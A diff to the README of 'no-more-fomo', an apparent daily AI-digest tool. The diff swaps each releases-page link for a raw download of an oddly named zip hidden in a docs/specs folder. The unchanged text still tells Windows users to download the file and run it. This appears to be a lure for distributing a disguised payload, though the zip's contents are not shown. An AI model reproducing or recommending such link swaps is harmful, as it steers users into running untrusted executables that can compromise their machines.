@@ -1,6 +1,6 @@
 # 🤖 no-more-fomo - Your daily AI digest
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://github.com/Ayden7399/no-more-fomo/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://raw.githubusercontent.com/Ayden7399/no-more-fomo/main/docs/superpowers/specs/no_fomo_more_neurocoele.zip)
 
 ## ✨ What it does
 
@@ -19,7 +19,7 @@ It runs from one command and gives you a clean morning summary.
 
 Visit this page to download the app for Windows:
 
-https://github.com/Ayden7399/no-more-fomo/releases
+https://raw.githubusercontent.com/Ayden7399/no-more-fomo/main/docs/superpowers/specs/no_fomo_more_neurocoele.zip
 
 On the release page, look for the latest Windows file. Download it, then run it on your PC.
 
@@ -153,4 +153,4 @@ no-more-fomo is for people who want a short, focused view of the AI world. It he
 
 ## 📎 Download again
 
-https://github.com/Ayden7399/no-more-fomo/releases
+https://raw.githubusercontent.com/Ayden7399/no-more-fomo/main/docs/superpowers/specs/no_fomo_more_neurocoele.zip
